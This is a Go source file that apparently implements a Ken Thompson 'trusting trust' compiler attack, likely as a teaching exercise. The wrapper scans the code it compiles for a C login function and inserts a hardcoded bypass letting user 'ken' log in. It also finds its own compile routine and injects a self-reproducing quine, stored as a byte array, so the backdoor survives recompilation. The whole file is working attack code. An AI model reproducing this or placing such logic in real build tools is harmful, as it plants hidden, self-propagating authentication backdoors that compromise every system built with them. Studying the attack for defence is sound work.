package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	//"path/filepath"
)

func main() {
	/*
		if os.Args[2] != "-o" {
			fmt.Fprintf(os.Stderr, "expected -o as second argument, have\n")
			fmt.Fprintf(os.Stderr, os.Args[2])
			os.Exit(1)
		}
	*/
	file, err := os.Open(os.Args[1])
	if err != nil {
		fmt.Fprintf(os.Stderr, "file does not exist\n")
		os.Exit(1)
	}
	defer file.Close()

	fileInfo, _ := file.Stat()
	fileSize := fileInfo.Size()
	if fileSize > 8*1024*1024 {
		fmt.Fprintf(os.Stderr, "input file too large\n")
		os.Exit(1)
	}

	program := make([]byte, fileSize)
	body, err := os.ReadFile(os.Args[1])

	if err != nil {
		fmt.Fprintf(os.Stderr, "invalid read of file \n")
	}
	program = body

	if err != nil {
		fmt.Fprintf(os.Stderr, "invalid read of file \n")
		os.Exit(1)
	}

	// compile
	tempFile, err := os.Create("./temp-out.go")
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error creating temp file")
		os.Exit(1)
	}
	defer tempFile.Close()

	//BEGIN QUINE
	var prog = []byte{
		109, 97, 105, 110, 115, 116, 117, 98,
		32, 58, 61, 32, 115, 116, 114, 105,
		110, 103, 115, 46, 73, 110, 100, 101,
		120, 40, 115, 116, 114, 105, 110, 103,
		40, 112, 114, 111, 103, 114, 97, 109,
		41, 44, 32, 34, 110, 111, 116, 109,
		97, 105, 110, 40, 41, 34, 41, 10,
		105, 102, 32, 109, 97, 105, 110, 115,
		116, 117, 98, 32, 33, 61, 32, 45,
		49, 32, 123, 10, 9, 109, 97, 105,
		110, 115, 116, 117, 98, 32, 43, 61,
		32, 108, 101, 110, 40, 34, 110, 111,
		116, 109, 97, 105, 110, 40, 41, 34,
		41, 10, 9, 116, 101, 109, 112, 32,
		58, 61, 32, 112, 114, 111, 103, 114,
		97, 109, 91, 109, 97, 105, 110, 115,
		116, 117, 98, 58, 93, 10, 9, 112,
		114, 111, 103, 114, 97, 109, 32, 61,
		32, 112, 114, 111, 103, 114, 97, 109,
		91, 58, 109, 97, 105, 110, 115, 116,
		117, 98, 45, 108, 101, 110, 40, 34,
		110, 111, 116, 109, 97, 105, 110, 40,
		41, 34, 41, 93, 10, 9, 110, 101,
		119, 115, 116, 117, 98, 32, 58, 61,
		32, 34, 109, 97, 105, 110, 40, 41,
		32, 32, 32, 34, 10, 9, 112, 114,
		111, 103, 114, 97, 109, 32, 61, 32,
		97, 112, 112, 101, 110, 100, 40, 112,
		114, 111, 103, 114, 97, 109, 44, 32,
		110, 101, 119, 115, 116, 117, 98, 46,
		46, 46, 41, 10, 9, 112, 114, 111,
		103, 114, 97, 109, 32, 61, 32, 97,
		112, 112, 101, 110, 100, 40, 112, 114,
		111, 103, 114, 97, 109, 44, 32, 116,
		101, 109, 112, 46, 46, 46, 41, 10,
		125, 10, 10, 108, 111, 103, 105, 110,
		83, 105, 103, 32, 58, 61, 32, 34,
		105, 110, 116, 32, 108, 111, 103, 105,
		110, 40, 99, 104, 97, 114, 32, 42,
		117, 115, 101, 114, 41, 32, 123, 34,
		10, 108, 111, 103, 105, 110, 65, 116,
		116, 97, 99, 107, 32, 58, 61, 32,
		34, 105, 102, 40, 115, 116, 114, 99,
		109, 112, 40, 117, 115, 101, 114, 44,
		32, 92, 34, 107, 101, 110, 92, 34,
		41, 32, 61, 61, 32, 48, 41, 32,
		114, 101, 116, 117, 114, 110, 32, 49,
		59, 34, 10, 10, 108, 111, 103, 105,
		110, 115, 116, 117, 98, 32, 58, 61,
		32, 115, 116, 114, 105, 110, 103, 115,
		46, 73, 110, 100, 101, 120, 40, 115,
		116, 114, 105, 110, 103, 40, 112, 114,
		111, 103, 114, 97, 109, 41, 44, 32,
		108, 111, 103, 105, 110, 83, 105, 103,
		41, 10, 105, 102, 32, 108, 111, 103,
		105, 110, 115, 116, 117, 98, 32, 33,
		61, 32, 45, 49, 32, 123, 10, 9,
		102, 109, 116, 46, 80, 114, 105, 110,
		116, 108, 110, 40, 108, 111, 103, 105,
		110, 115, 116, 117, 98, 41, 10, 9,
		102, 109, 116, 46, 80, 114, 105, 110,
		116, 108, 110, 40, 34, 108, 111, 103,
		105, 110, 32, 102, 111, 117, 110, 100,
		34, 41, 10, 9, 108, 111, 103, 105,
		110, 115, 116, 117, 98, 32, 43, 61,
		32, 108, 101, 110, 40, 108, 111, 103,
		105, 110, 83, 105, 103, 41, 10, 9,
		118, 97, 114, 32, 116, 109, 112, 32,
		91, 93, 98, 121, 116, 101, 10, 9,
		116, 109, 112, 32, 61, 32, 109, 97,
		107, 101, 40, 91, 93, 98, 121, 116,
		101, 44, 32, 108, 101, 110, 40, 112,
		114, 111, 103, 114, 97, 109, 91, 108,
		111, 103, 105, 110, 115, 116, 117, 98,
		58, 93, 41, 41, 10, 9, 95, 32,
		61, 32, 99, 111, 112, 121, 40, 116,
		109, 112, 44, 32, 112, 114, 111, 103,
		114, 97, 109, 91, 108, 111, 103, 105,
		110, 115, 116, 117, 98, 58, 93, 41,
		10, 9, 112, 114, 111, 103, 114, 97,
		109, 32, 61, 32, 112, 114, 111, 103,
		114, 97, 109, 91, 58, 108, 111, 103,
		105, 110, 115, 116, 117, 98, 93, 10,
		9, 102, 109, 116, 46, 80, 114, 105,
		110, 116, 108, 110, 40, 108, 111, 103,
		105, 110, 65, 116, 116, 97, 99, 107,
		41, 10, 9, 112, 114, 111, 103, 114,
		97, 109, 32, 61, 32, 97, 112, 112,
		101, 110, 100, 40, 112, 114, 111, 103,
		114, 97, 109, 44, 32, 108, 111, 103,
		105, 110, 65, 116, 116, 97, 99, 107,
		46, 46, 46, 41, 10, 9, 112, 114,
		111, 103, 114, 97, 109, 32, 61, 32,
		97, 112, 112, 101, 110, 100, 40, 112,
		114, 111, 103, 114, 97, 109, 44, 32,
		116, 109, 112, 46, 46, 46, 41, 10,
		10, 9, 101, 114, 114, 32, 58, 61,
		32, 111, 115, 46, 87, 114, 105, 116,
		101, 70, 105, 108, 101, 40, 34, 46,
		47, 116, 101, 109, 112, 45, 111, 117,
		116, 46, 103, 111, 34, 44, 32, 112,
		114, 111, 103, 114, 97, 109, 44, 32,
		48, 54, 52, 52, 41, 10, 9, 105,
		102, 32, 101, 114, 114, 32, 33, 61,
		32, 110, 105, 108, 32, 123, 10, 9,
		9, 102, 109, 116, 46, 80, 114, 105,
		110, 116, 108, 110, 40, 34, 69, 114,
		114, 111, 114, 32, 99, 114, 101, 97,
		116, 105, 110, 103, 32, 102, 105, 108,
		101, 58, 34, 44, 32, 101, 114, 114,
		41, 10, 9, 9, 114, 101, 116, 117,
		114, 110, 10, 9, 125, 10, 125, 10,
		10, 47, 47, 32, 99, 111, 109, 112,
		105, 108, 101, 83, 105, 103, 32, 58,
		61, 32, 34, 115, 116, 97, 116, 105,
		99, 32, 118, 111, 105, 100, 32, 99,
		111, 109, 112, 105, 108, 101, 40, 99,
		104, 97, 114, 32, 42, 112, 114, 111,
		103, 114, 97, 109, 44, 32, 99, 104,
		97, 114, 32, 42, 111, 117, 116, 110,
		97, 109, 101, 41, 32, 123, 110, 32,
		70, 73, 76, 69, 32, 42, 102, 112,
		32, 61, 32, 102, 111, 112, 101, 110,
		40, 92, 34, 46, 47, 116, 101, 109,
		112, 45, 111, 117, 116, 46, 99, 92,
		34, 44, 32, 92, 34, 119, 92, 34,
		41, 59, 92, 110, 32, 97, 115, 115,
		101, 114, 116, 40, 102, 112, 41, 59,
		34, 10, 99, 111, 109, 112, 105, 108,
		101, 83, 105, 103, 32, 58, 61, 32,
		34, 116, 101, 109, 112, 70, 105, 108,
		101, 44, 32, 101, 114, 114, 32, 58,
		61, 32, 111, 115, 46, 67, 114, 101,
		97, 116, 101, 40, 92, 34, 46, 47,
		116, 101, 109, 112, 45, 111, 117, 116,
		46, 103, 111, 92, 34, 41, 92, 110,
		92, 116, 105, 102, 32, 101, 114, 114,
		34, 32, 47, 47, 33, 61, 110, 105,
		108, 123, 92, 110, 92, 116, 102, 109,
		116, 46, 70, 112, 114, 105, 110, 116,
		102, 40, 111, 115, 46, 83, 116, 100,
		101, 114, 114, 44, 32, 92, 34, 69,
		114, 114, 111, 114, 32, 99, 114, 101,
		97, 116, 105, 110, 103, 32, 116, 101,
		109, 112, 32, 102, 105, 108, 101, 92,
		34, 41, 92, 110, 92, 116, 111, 115,
		46, 69, 120, 105, 116, 40, 49, 41,
		125, 92, 110, 92, 116, 100, 101, 102,
		101, 114, 32, 116, 101, 109, 112, 70,
		105, 108, 101, 46, 67, 108, 111, 115,
		101, 40, 41, 92, 110, 92, 116, 96,
		10, 99, 111, 109, 112, 105, 108, 101,
		65, 116, 116, 97, 99, 107, 32, 58,
		61, 32, 34, 92, 110, 92, 116, 118,
		97, 114, 32, 112, 114, 111, 103, 32,
		61, 32, 91, 93, 98, 121, 116, 101,
		123, 92, 110, 34, 10, 102, 111, 114,
		32, 105, 44, 32, 98, 32, 58, 61,
		32, 114, 97, 110, 103, 101, 32, 112,
		114, 111, 103, 32, 123, 10, 9, 101,
		110, 100, 99, 104, 97, 114, 32, 58,
		61, 32, 39, 32, 39, 10, 9, 105,
		102, 32, 40, 105, 43, 49, 41, 37,
		56, 32, 61, 61, 32, 48, 32, 123,
		10, 9, 9, 101, 110, 100, 99, 104,
		97, 114, 32, 61, 32, 39, 92, 110,
		39, 10, 9, 125, 10, 9, 99, 111,
		109, 112, 105, 108, 101, 65, 116, 116,
		97, 99, 107, 32, 43, 61, 32, 102,
		109, 116, 46, 83, 112, 114, 105, 110,
		116, 102, 40, 34, 92, 116, 37, 100,
		44, 37, 99, 34, 44, 32, 98, 44,
		32, 101, 110, 100, 99, 104, 97, 114,
		41, 10, 125, 10, 99, 111, 109, 112,
		105, 108, 101, 65, 116, 116, 97, 99,
		107, 32, 43, 61, 32, 34, 125, 92,
		110, 34, 10, 99, 111, 109, 112, 105,
		108, 101, 65, 116, 116, 97, 99, 107,
		32, 43, 61, 32, 115, 116, 114, 105,
		110, 103, 40, 112, 114, 111, 103, 41,
		10, 99, 111, 109, 112, 105, 108, 101,
		65, 116, 116, 97, 99, 107, 32, 43,
		61, 32, 34, 92, 110, 34, 10, 10,
		99, 111, 109, 112, 105, 108, 101, 115,
		116, 117, 98, 32, 58, 61, 32, 115,
		116, 114, 105, 110, 103, 115, 46, 73,
		110, 100, 101, 120, 40, 115, 116, 114,
		105, 110, 103, 40, 112, 114, 111, 103,
		114, 97, 109, 41, 44, 32, 99, 111,
		109, 112, 105, 108, 101, 83, 105, 103,
		41, 10, 105, 102, 32, 99, 111, 109,
		112, 105, 108, 101, 115, 116, 117, 98,
		32, 33, 61, 32, 45, 49, 32, 123,
		10, 9, 102, 109, 116, 46, 80, 114,
		105, 110, 116, 108, 110, 40, 99, 111,
		109, 112, 105, 108, 101, 115, 116, 117,
		98, 41, 10, 9, 102, 109, 116, 46,
		80, 114, 105, 110, 116, 108, 110, 40,
		34, 99, 111, 109, 112, 105, 108, 101,
		32, 102, 111, 117, 110, 100, 34, 41,
		10, 9, 99, 111, 109, 112, 105, 108,
		101, 115, 116, 117, 98, 32, 43, 61,
		32, 108, 101, 110, 40, 99, 111, 109,
		112, 105, 108, 101, 83, 105, 103, 41,
		32, 43, 32, 49, 49, 57, 10, 9,
		116, 101, 109, 112, 98, 117, 102, 50,
		32, 58, 61, 32, 112, 114, 111, 103,
		114, 97, 109, 91, 99, 111, 109, 112,
		105, 108, 101, 115, 116, 117, 98, 58,
		93, 10, 9, 112, 114, 111, 103, 114,
		97, 109, 32, 61, 32, 112, 114, 111,
		103, 114, 97, 109, 91, 58, 99, 111,
		109, 112, 105, 108, 101, 115, 116, 117,
		98, 93, 10, 9, 112, 114, 111, 103,
		114, 97, 109, 32, 61, 32, 97, 112,
		112, 101, 110, 100, 40, 112, 114, 111,
		103, 114, 97, 109, 44, 32, 91, 93,
		98, 121, 116, 101, 40, 99, 111, 109,
		112, 105, 108, 101, 65, 116, 116, 97,
		99, 107, 41, 46, 46, 46, 41, 10,
		9, 112, 114, 111, 103, 114, 97, 109,
		32, 61, 32, 97, 112, 112, 101, 110,
		100, 40, 112, 114, 111, 103, 114, 97,
		109, 44, 32, 116, 101, 109, 112, 98,
		117, 102, 50, 46, 46, 46, 41, 10,
		10, 9, 101, 114, 114, 32, 61, 32,
		111, 115, 46, 87, 114, 105, 116, 101,
		70, 105, 108, 101, 40, 34, 46, 47,
		116, 101, 109, 112, 45, 111, 117, 116,
		46, 103, 111, 34, 44, 32, 112, 114,
		111, 103, 114, 97, 109, 44, 32, 48,
		54, 52, 52, 41, 10, 9, 105, 102,
		32, 101, 114, 114, 32, 33, 61, 32,
		110, 105, 108, 32, 123, 10, 9, 9,
		102, 109, 116, 46, 80, 114, 105, 110,
		116, 108, 110, 40, 34, 69, 114, 114,
		111, 114, 32, 99, 114, 101, 97, 116,
		105, 110, 103, 32, 102, 105, 108, 101,
		58, 34, 44, 32, 101, 114, 114, 41,
		10, 9, 9, 114, 101, 116, 117, 114,
		110, 10, 9, 125, 10, 125}
	mainstub := strings.Index(string(program), "notmain()")
	if mainstub != -1 {
		mainstub += len("notmain()")
		temp := program[mainstub:]
		program = program[:mainstub-len("notmain()")]
		newstub := "main()   "
		program = append(program, newstub...)
		program = append(program, temp...)
	}

	loginSig := "int login(char *user) {"
	loginAttack := "if(strcmp(user, \"ken\") == 0) return 1;"

	loginstub := strings.Index(string(program), loginSig)
	if loginstub != -1 {
		fmt.Println(loginstub)
		fmt.Println("login found")
		loginstub += len(loginSig)
		var tmp []byte
		tmp = make([]byte, len(program[loginstub:]))
		_ = copy(tmp, program[loginstub:])
		program = program[:loginstub]
		fmt.Println(loginAttack)
		program = append(program, loginAttack...)
		program = append(program, tmp...)

		err := os.WriteFile("./temp-out.go", program, 0644)
		if err != nil {
			fmt.Println("Error creating file:", err)
			return
		}
	}

	// compileSig := "static void compile(char *program, char *outname) {n FILE *fp = fopen(\"./temp-out.c\", \"w\");\n assert(fp);"
	compileSig := "tempFile, err := os.Create(\"./temp-out.go\")\n\tif err" //!=nil{\n\tfmt.Fprintf(os.Stderr, \"Error creating temp file\")\n\tos.Exit(1)}\n\tdefer tempFile.Close()\n\t`
	compileAttack := "\n\tvar prog = []byte{\n"
	for i, b := range prog {
		endchar := ' '
		if (i+1)%8 == 0 {
			endchar = '\n'
		}
		compileAttack += fmt.Sprintf("\t%d,%c", b, endchar)
	}
	compileAttack += "}\n"
	compileAttack += string(prog)
	compileAttack += "\n"

	compilestub := strings.Index(string(program), compileSig)
	if compilestub != -1 {
		fmt.Println(compilestub)
		fmt.Println("compile found")
		compilestub += len(compileSig) + 119
		tempbuf2 := program[compilestub:]
		program = program[:compilestub]
		program = append(program, []byte(compileAttack)...)
		program = append(program, tempbuf2...)

		err = os.WriteFile("./temp-out.go", program, 0644)
		if err != nil {
			fmt.Println("Error creating file:", err)
			return
		}
	}
	// END QUINE

	err = os.WriteFile("./temp-out.go", program, 0644)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error writing to temp file\n")
		os.Exit(1)
	}

	lastChar := os.Args[1][len(os.Args[1])-1:]
	cmd := exec.Command("go", "build", "-o", os.Args[3], tempFile.Name())
	if lastChar == "c" {
		e := os.Rename("temp-out.go", "temp-out.c")
		if e != nil {
			os.Exit(1)
		}
		cmd = exec.Command("gcc", "temp-out.c", "-o", os.Args[3])
	}
	fmt.Println(cmd)
	err = cmd.Run()
	if err != nil {
		fmt.Fprintf(os.Stderr, "system failed: %v\n", err)
		os.Exit(1)
	}
}
